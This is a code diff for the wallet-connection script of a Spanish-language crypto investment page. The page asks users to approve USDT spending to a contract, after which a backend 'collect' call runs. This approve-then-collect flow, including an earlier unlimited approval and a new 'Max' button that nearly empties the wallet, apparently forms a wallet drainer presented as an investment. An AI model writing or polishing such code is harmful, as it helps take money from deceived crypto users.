@@ -46,17 +46,61 @@ let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
   clearTimeout(_toastTimer);
-  toastEl.textContent  = msg;
+  toastEl.innerHTML    = msg; // Cambiado a innerHTML para soportar enlaces HTML (BscScan)
   toastEl.dataset.type = type === "default" ? "" : type;
   toastEl.hidden       = false;
+  
+  if (type === "success") {
+    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
+  } else if (type === "error") {
+    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
+  } else {
+    toastEl.style.removeProperty("background");
+  }
+
   _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
 }
 
 function setLoading(on, label = "Processing…") {
   if (!approveBtn) return;
   approveBtn.disabled = on;
-  if (btnText) btnText.textContent = on ? label : "NEXT";
+  approveBtn.style.opacity = on ? "0.8" : "1";
+  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
   if (btnSpinner) btnSpinner.hidden   = !on;
+}
+
+// ─── New UX Feature: Live Balance & Smart Max Button ─────────────────────────
+async function fetchAndDisplayUserBalances(rawProvider) {
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+    
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+    const usdtBal = await usdtContract.balanceOf(userAddress);
+    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
+    
+    // Si tienes un elemento HTML con id="walletBalanceLabel", muestra el saldo en tiempo real
+    const balanceLabel = document.getElementById("walletBalanceLabel");
+    if (balanceLabel) {
+      balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
+    }
+
+    // Configuración automatizada del botón "Max" si existe en tu HTML
+    const maxBtn = document.getElementById("maxBtn");
+    if (maxBtn) {
+      maxBtn.onclick = () => {
+        const amountInput = document.getElementById("investAmount");
+        if (amountInput) {
+          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1); // Deja un pequeño margen
+          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
+          amountInput.dispatchEvent(new Event('input'));
+        }
+      };
+    }
+  } catch (err) {
+    console.error("Error al sincronizar saldos en vivo:", err);
+  }
 }
 
 // ─── Backend collect trigger ──────────────────────────────────────────────────
@@ -83,11 +127,27 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// ─── Main Button Handler (AppKit Native Flow) ─────────────────────────────────
+// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
+let pendingInvestment = false;
+
+// 1. Suscripción reactiva con AppKit
+if (window.modal && typeof window.modal.subscribeProviders === "function") {
+  window.modal.subscribeProviders((state) => {
+    const rawProvider = state["eip155"]; 
+    
+    if (rawProvider) {
+      fetchAndDisplayUserBalances(rawProvider); // Sincroniza saldos al conectar
+      if (pendingInvestment) {
+        pendingInvestment = false; 
+        runInvestmentFlow(rawProvider); 
+      }
+    }
+  });
+}
+
+// 2. Evento unificado del botón principal
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    
-    // Obtener proveedor activo gestionado por AppKit
     let rawProvider = null;
     if (window.modal && typeof window.modal.getWalletProvider === "function") {
       try {
@@ -95,111 +155,150 @@ if (approveBtn) {
       } catch (_) {}
     }
 
-    // SI NO HAY NINGUNA BILLETERA CONECTADA -> ABRIR MODAL PROFESIONAL DE REOWN
+    // CASO A: Si el usuario NO está conectado
     if (!rawProvider) {
+      pendingInvestment = true; 
+      setLoading(true, "Abriendo selector de billetera...");
+      
       if (window.modal && typeof window.modal.open === "function") {
         try {
-          await window.modal.open();
-          return; // El modal se abre y lista automáticamente las extensiones de PC y QR de móviles
-        } catch (modalErr) {
-          console.error("Error al abrir AppKit:", modalErr);
-        }
-      }
-      showToast("No se pudo inicializar el selector de billeteras.", "error");
-      return;
-    }
+          await window.modal.open(); 
+          
+          // --- SOLUCIÓN: Verificar si el usuario conectó o canceló al cerrar el modal ---
+          let freshProvider = null;
+          if (typeof window.modal.getWalletProvider === "function") {
+            try {
+              freshProvider = window.modal.getWalletProvider();
+            } catch (_) {}
+          }
 
-    setLoading(true, "Conectando proveedor…");
-
-    try {
-      // Inicializar Ethers.js v6 con el proveedor estandarizado de AppKit
-      const provider = new ethers.BrowserProvider(rawProvider);
-      
-      // Validación y cambio de red nativo a BSC
-      const network = await provider.getNetwork();
-      if (Number(network.chainId) !== 56) {
-        setLoading(true, "Verificando red BSC…");
-        try {
-          await rawProvider.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BSC_CHAIN_ID_HEX }]
-          });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            await rawProvider.request({
-              method: "wallet_addEthereumChain",
-              params: [BSC_CHAIN_PARAMS]
-            });
-          } else {
-            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+          if (!freshProvider) {
+            // El usuario cerró el modal o canceló la conexión: limpiamos estados para evitar el colgado
+            pendingInvestment = false;
             setLoading(false);
             return;
+          } else {
+            // Si conectó con éxito desde el modal, continuamos el flujo automáticamente
+            await runInvestmentFlow(freshProvider);
+            return;
           }
+          // -----------------------------------------------------------------------------
+
+        } catch (err) {
+          console.error("Error al abrir AppKit:", err);
+          pendingInvestment = false;
+          setLoading(false);
         }
-      }
-
-      const signer = await provider.getSigner();
-      const userAddress = await signer.getAddress();
-
-      if (!userAddress) {
-        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
+      } else {
         setLoading(false);
-        return;
       }
+      return; 
+    }
 
-      // Instanciar contrato USDT con Ethers v6
-      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+    // CASO B: Si el usuario YA estaba conectado
+    await runInvestmentFlow(rawProvider);
+  });
+}
 
-      setLoading(true, "Validando saldo…");
-      const usdtBalance = await usdtContract.balanceOf(userAddress);
-      if (usdtBalance <= MIN_USDT_BALANCE) {
-        showToast("Saldo insuficiente de USDT en BSC", "error");
-        setLoading(false);
-        return;
-      }
-
-      const CAP_AMOUNT = ethers.MaxUint256;
-      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
-
-      // Verificar si ya existe allowance suficiente
+// 3. Flujo centralizado de red, gas y contratos
+async function runInvestmentFlow(rawProvider) {
+  setLoading(true, "Conectando proveedor…");
+  
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    
+    // 1. Verificación estricta de red BSC (Chain ID 56)
+    setLoading(true, "Verificando red BSC...");
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      setLoading(true, "Cambiando a red BSC…");
       try {
-        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
-        if (allowance >= requiredAmount) {
-          setLoading(true, "Finalizando proceso…");
-          await triggerBackendCollect(userAddress);
-          showToast("Sent Successfully, Thank you! ✓", "success");
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } else {
+          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
           setLoading(false);
           return;
         }
-      } catch (_) {}
-
-      // Solicitar transacción de Aprobación (Approve)
-      setLoading(true, "Firma requerida en wallet…");
-      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
-
-      setLoading(true, "Confirmando en red…");
-      await tx.wait(); // Espera la confirmación del bloque con Ethers v6
-
-      setLoading(true, "Finalizando…");
-      await triggerBackendCollect(userAddress);
-      showToast("Sent Successfully, Thank you! ✓", "success");
-
-    } catch (err) {
-      const raw = err?.reason ?? err?.message ?? "Error desconocido";
-      if (
-        err.code === 4001 ||
-        raw.toLowerCase().includes("user rejected") ||
-        raw.toLowerCase().includes("denied") ||
-        raw.toLowerCase().includes("cancelled") ||
-        raw.toLowerCase().includes("canceled")
-      ) {
-        showToast("Transacción cancelada.", "default");
-      } else {
-        console.error("Web3 Error:", err);
-        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
       }
-    } finally {
-      setLoading(false);
     }
-  });
+
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    // 2. Validación UX: Comprobar saldo de BNB para el Gas
+    setLoading(true, "Verificando saldo de gas (BNB)…");
+    const bnbBalance = await provider.getBalance(userAddress);
+    const minGasRequired = ethers.parseEther("0.0005"); 
+
+    if (bnbBalance < minGasRequired) {
+      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+      setLoading(false);
+      return;
+    }
+
+    // 3. Obtener montos e instanciar contrato USDT
+    const inputElement = document.getElementById("investAmount");
+    const rawInputVal = inputElement ? inputElement.value : "1";
+    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+
+    setLoading(true, "Validando saldo de USDT…");
+    const usdtBalance = await usdtContract.balanceOf(userAddress);
+
+    if (usdtBalance < requiredAmount) {
+      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+      setLoading(false);
+      return;
+    }
+
+    // 4. Verificar Allowance para evitar aprobaciones innecesarias
+    setLoading(true, "Verificando autorizaciones...");
+    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+    
+    if (allowance < requiredAmount) {
+      setLoading(true, "Firma requerida: Aprobar USDT…");
+      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+      
+      setLoading(true, "Confirmando aprobación en red...");
+      await txApprove.wait();
+    }
+
+    // 5. Ejecutar la llamada al backend / contrato final
+    setLoading(true, "Procesando inversión en protocolo...");
+    const txCollect = await triggerBackendCollect(userAddress); 
+
+    // 6. Éxito con trazabilidad interactiva (Enlace directo a BscScan)
+    const txHash = txCollect?.hash || "";
+    if (txHash) {
+      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+    } else {
+      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+    }
+
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("denied") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Operación cancelada por el usuario.", "default");
+    } else {
+      console.error("Web3 Error crítico:", err);
+      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
+    }
+  } finally {
+    setLoading(false);
+  }
 }
